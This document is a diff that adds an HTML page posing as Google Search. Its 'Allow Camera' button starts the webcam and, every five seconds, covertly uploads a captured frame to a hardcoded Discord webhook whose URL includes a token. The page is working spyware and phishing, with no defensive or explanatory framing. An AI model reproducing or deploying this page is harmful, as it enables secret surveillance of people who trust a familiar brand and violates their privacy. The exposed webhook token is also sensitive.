@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Search</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
+        }
+        input {
+            width: 400px;
+            padding: 10px;
+            font-size: 18px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Google</h1>
+    <input type="text" placeholder="Search Google or type a URL">
+    <br><br>
+    <button onclick="startCamera()">Allow Camera</button>
+    <video id="video" width="400" height="300" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    
+    <script>
+        let stream;
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+                document.getElementById('video').style.display = 'block';
+                captureImage();
+            } catch (error) {
+                console.error("Camera access denied", error);
+            }
+        }
+        
+        function captureImage() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            setInterval(() => {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                    sendToDiscord(blob);
+                }, 'image/png');
+            }, 5000); // Capture every 5 seconds
+        }
+        
+        function sendToDiscord(imageBlob) {
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1340962712481693747/MORxmuw4kPxnfk91IChsW8mT3MKVlnwYSlR1rwEpT9Fp7Ij2GG_-RdXDt5oDXTVKv-zq';
+            const formData = new FormData();
+            formData.append("file", imageBlob, "capture.png");
+            
+            fetch(webhookUrl, {
+                method: "POST",
+                body: formData
+            }).catch(err => console.error("Error sending image to Discord", err));
+        }
+        
+        window.addEventListener("beforeunload", () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
